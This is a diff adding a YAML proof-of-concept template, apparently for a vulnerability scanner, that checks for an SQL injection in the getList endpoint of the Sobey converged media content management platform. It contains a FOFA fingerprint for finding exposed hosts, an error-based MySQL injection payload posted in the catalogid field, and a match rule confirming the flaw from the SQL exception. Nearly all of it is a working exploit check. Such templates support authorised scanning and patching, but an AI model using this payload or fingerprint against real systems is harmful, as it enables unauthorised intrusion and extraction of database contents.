@@ -1,0 +1,20 @@
+id: poc-yaml-sobey-imcmp-getlist-sqli
+info:
+  name: 索贝融合媒体内容管理平台 getList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /sobey-mchEditor/mch/Articlelist/getList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: catalogid=1 AND GTID_SUBSET(CONCAT(md5({{.t1}}),(SELECT (ELT(9852=9852,0x7e))),0x7e),9852)
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,t2 + `~~`)
+    && contains(body,"java.sql.SQLException")
+transport: http
